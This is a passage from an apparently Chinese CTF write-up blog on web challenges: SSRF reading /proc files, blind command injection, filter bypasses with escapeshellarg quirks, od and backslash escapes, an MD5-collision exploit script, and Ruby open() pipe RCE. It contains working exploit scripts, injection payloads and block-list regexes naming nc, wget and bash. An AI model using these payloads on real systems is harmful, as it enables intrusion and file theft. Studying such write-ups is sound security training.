class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">import</span> re<br><br>pattern = <span class="hljs-string">r&#x27;&lt;div id=&quot;readability-page-1&quot; class=&quot;page&quot;&gt;(.+?)&lt;/div&gt;&#x27;</span><br><br><br>data = <span class="hljs-string">&#x27;&#123;&quot;url&quot;:&quot;file:///proc/18/environ&quot;&#125;&#x27;</span><br><span class="hljs-comment">#&#x27;&#123;&quot;url&quot;:&quot;file:///proc/self/status&quot;&#125;&#x27;</span><br><br>url = <span class="hljs-string">&quot;http://43.143.7.127:28318/read/&quot;</span><br><br>r = requests.get(url = url + base64.b64encode(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.html&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(r.content)<br><br>target = re.findall(pattern, r.text)<br><br><span class="hljs-built_in">print</span>(target)<br></code></pre></td></tr></table></figure><h2 id="rce">2、RCE</h2><h3 id="swpufinalrce无回显rce">1、SWPU—finalrce（无回显rce）</h3><p>无回显RCE的方法常见的思路有：</p><ul><li>DNS外带</li><li>反弹shell</li></ul><p>每种方法都有很多的trick，比如反弹shell就有非常多的方法，后续可能出一篇反弹shell的总结。</p><p>先看这道题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        exec(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看这主要的过滤对象，就是针对反弹shell的。</p><p>先试试能不能rce</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?url=sleep%205<br></code></pre></td></tr></table></figure><p>能够看到果然出现了5s的延迟，那接下来选择外带，我这里用的curl，打的是自己的服务器，ceye.io有的时候感觉没有那么好用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">dir / | sed s/[[:space:]]/xx/g | tr &#x27;\n&#x27; &#x27;*&#x27;<br><span class="hljs-meta">#</span><span class="bash"> 把空格和tab替换成x，换行替换成</span><br>dir / | tr &#x27; &#x27; &#x27;x&#x27; |tr &#x27;\t&#x27; &#x27;x&#x27;|tr &#x27;\n&#x27; &#x27;,&#x27;<br></code></pre></td></tr></table></figure><p>这种方法的麻烦点就在于要构造合适的payload，也没有办法一梭子进去轻松rce，实际到那道题中构造payload也是要各种绕过（可以参考我之前那篇博客</p><p>补充：这题后来发现开了写权限，所以其实直接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?url=tac /flllll\aaaaaaggggggg | tee 1.txt<br></code></pre></td></tr></table></figure><h3 id="广东强网pokemenunicode过滤od命令">2、21广东强网——Pokemen（unicode过滤/od命令）</h3><p>先来看这道题的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">DefenderBonus</span>(<span class="hljs-params"><span class="hljs-variable">$Pokemon</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="hljs-variable">$Pokemon</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;catch broken Pokemon! mew-_-two&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Pokemon</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ghostpokemon</span>(<span class="hljs-params"><span class="hljs-variable">$Pokemon</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$Pokemon</span>))&#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$Pokemon</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$pks</span>) &#123;<br>            <span class="hljs-variable">$Pokemon</span>[<span class="hljs-variable">$key</span>] = DefenderBonus(<span class="hljs-variable">$pks</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$Pokemon</span> = DefenderBonus(<span class="hljs-variable">$Pokemon</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;myfavorite&#x27;</span>] ?? <span class="hljs-string">&quot;&quot;</span>)&#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;picacu!&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;picacu!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;bulbasaur!&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;miaowa!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-variable">$level</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;levelup&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> ((!preg_match(<span class="hljs-string">&#x27;/lv100/i&#x27;</span>,<span class="hljs-variable">$level</span>)) &amp;&amp; (preg_match(<span class="hljs-string">&#x27;/lv100/i&#x27;</span>,escapeshellarg(<span class="hljs-variable">$level</span>))))&#123;<br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&#x27;./hint.php&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;squirtle&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> md5(<span class="hljs-string">&#x27;jienijieni!&#x27;</span>).md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;mewtwo&#x27;</span>:<br>        <span class="hljs-variable">$dream</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;dream&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$dream</span>)&gt;=<span class="hljs-number">20</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;So Big Pokenmon!&quot;</span>);<br>        &#125;<br>        ghostpokemon(<span class="hljs-variable">$dream</span>);<br>        <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$dream</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先一眼看去就是拿hint，也就是要创造字符串，使之被<code>escapeshellarg</code>处理之后存在<code>lv100</code>的字串。</p><p>这里我们可以利用unicode字符会被过滤的效果来实现，我们可以发现在<code>%80</code>之后的unicode字符会被该函数自动过滤掉，类似的处理在sql注入中也有（输入<code>%c2</code>这种utf-8中不存在的字符，也会被过滤）。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816223126427.png" alt="image-20220816223126427" style="zoom:50%;" /></p><p>得到hint之后，显然就是构造一些巧妙的命令，直接去读取<code>/FLAG</code>文件。</p><p>首先要考虑读取文件，常见的读取方式显然不行，这里可以考虑使用<code>od</code>命令，空格的过滤利用<code>%09</code>代替，部分字符可以利用正则匹配实现，最后的命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">od%</span><span class="bash">09-c%09/F[B-Z][@-C]G</span><br></code></pre></td></tr></table></figure><p>成功读取到了flag。</p><h3 id="安询杯ez_web">3、安询杯——ez_web</h3><p>打开环境之后，观察url</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">1.14.71.254:28200</span>/index.php?img=TXpVek<span class="hljs-number">5</span>UTTFNbVUzTURabE<span class="hljs-number">5</span>qYz<span class="hljs-number">0</span>&amp;cmd=<br></code></pre></td></tr></table></figure><p>尝试解码img参数，发现这里有着文件包含的洞</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819203318445.png" alt="image-20220819203318445" style="zoom:50%;" /></p><p>直接尝试php伪协议，发现无果，直接尝试index.php（猜测会将文件内容先用base64编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>果然拿到index.php的编码，原来是被正则过滤了。</p><p>md5的绕过非常简单，主要在于构造rce命令</p><p>首先使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dir /<br></code></pre></td></tr></table></figure><p>发现flag在根目录下，接下来就是读取文件，从网上学到可以使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sort /flag<br></code></pre></td></tr></table></figure><p>不过这里介绍另外一个php的点，先给一个demo代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$tar</span> = <span class="hljs-string">&quot;abc(\\&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar</span>.<span class="hljs-string">&quot;\n&lt;br&gt;\n&quot;</span>;<br><span class="hljs-variable">$tar1</span> = preg_replace(<span class="hljs-string">&quot;/\\|\\\\|\(|b|a|c/i&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$tar</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&lt;br&gt;\n&quot;</span>;<br><span class="hljs-variable">$tar1</span> = preg_replace(<span class="hljs-string">&quot;/\\\\/i&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$tar</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tar1</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*********</span><br><span class="hljs-comment">before : &quot;abc\&quot;</span><br><span class="hljs-comment">replace: &quot;\&quot;</span><br><span class="hljs-comment">replace: &quot;\&quot;</span><br><span class="hljs-comment">***********/</span><br></code></pre></td></tr></table></figure><p>非常有意思的点在于，当正则中存在<code>\\</code>这样的语句时，会无效化后面的一个匹配项，当你要过滤<code>\</code>，你需要使用<code>\\\\</code>来实现，由此观察源代码，你会发现其实<code>\</code>并没有被过滤。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">c\at /flag<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote,quote<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">toAsciiHex</span>(<span class="hljs-params">s</span>):</span><br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://1.14.71.254:28200&quot;</span><br>    path = <span class="hljs-string">&quot;/index.php&quot;</span><br><br>    <span class="hljs-comment"># url = &quot;http://127.0.0.1&quot;</span><br>    <span class="hljs-comment"># path = &quot;/1.php&quot;</span><br><br>    filename = <span class="hljs-string">&quot;index.php&quot;</span><br>    cmd = <span class="hljs-string">&quot;c\\at /flag&quot;</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;img&quot;</span>:base64.b64encode(<br>                base64.b64encode(<br>                    toAsciiHex(filename).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))),<br>        <span class="hljs-string">&quot;cmd&quot;</span>:cmd,<br>    &#125;<br><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&quot;</span>)<br>    select = pattern.findall(cmd)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-literal">False</span>):<br>    <span class="hljs-comment">#if(select != []):</span><br>        <span class="hljs-built_in">print</span>(select)<br>    <span class="hljs-keyword">else</span>:<br>        proxies = &#123;<br>            <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>        &#125;<br><br>        <span class="hljs-comment"># md5</span><br>        a = <span class="hljs-string">r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1%ADn%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%96%B7%14%92%9B%88Oh%93%3E%EBb%3C%CB%9B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EUQ%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8%CCU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%05%3D%29%C1%5E&quot;</span><br>        b = <span class="hljs-string">r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1-n%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%16%B8%14%92%9B%88Oh%93%3E%EBb%3C%CB%1B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EU%D1%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8LU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%85%3D%29%C1%5E&quot;</span><br><br>        headers = &#123;<br>            <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>        &#125;<br><br>        data = <span class="hljs-string">&quot;a=&quot;</span>+a+<span class="hljs-string">&quot;&amp;b=&quot;</span>+b<br>        r = requests.post(url = url + path,params=params,proxies=proxies,headers=headers,data=data)<br><br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="第五空间png转换器ruby">4、第五空间—PNG转换器（Ruby）</h3><p>这道题考察的是Ruby的rce</p><p>对于Ruby内置的open函数，如果传入的参数开头为管道运算符，则可以实现rce。</p><p>首先查看源代码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;digest&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;base64&#x27;</span><br><br>get <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/index.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&#x27;/upload&#x27;</span> <span class="hljs-keyword">do</span><br>  open(<span class="hljs-string">&quot;./view/upload.html&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&#x27;/upload&#x27;</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:file</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:tempfile</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>] &amp;&amp; params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>].split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;png&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">begin</span><br>    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:filename</span>]) + <span class="hljs-string">&#x27;.png&#x27;</span><br>    open(filename, <span class="hljs-string">&#x27;wb&#x27;</span>) &#123; <span class="hljs-params">|f|</span><br>      f.write open(params[<span class="hljs-symbol">:file</span>][<span class="hljs-symbol">:tempfile</span>],<span class="hljs-string">&#x27;r&#x27;</span>).read()<br>    &#125;<br>    <span class="hljs-string">&quot;Upload success, file stored at <span class="hljs-subst">#&#123;filename&#125;</span>&quot;</span><br>  <span class="hljs-keyword">rescue</span><br>    <span class="hljs-string">&#x27;something wrong&#x27;</span><br>  <span class="hljs-keyword">end</span><br><br><span 